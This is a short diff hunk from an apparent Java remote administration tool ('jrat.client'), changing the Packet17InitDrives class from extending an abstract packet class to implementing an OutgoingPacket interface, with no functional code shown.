@@ -5,7 +5,7 @@ import jrat.client.Connection;
 import java.io.File;
 
 
-public class Packet17InitDrives extends AbstractOutgoingPacket {
+public class Packet17InitDrives implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
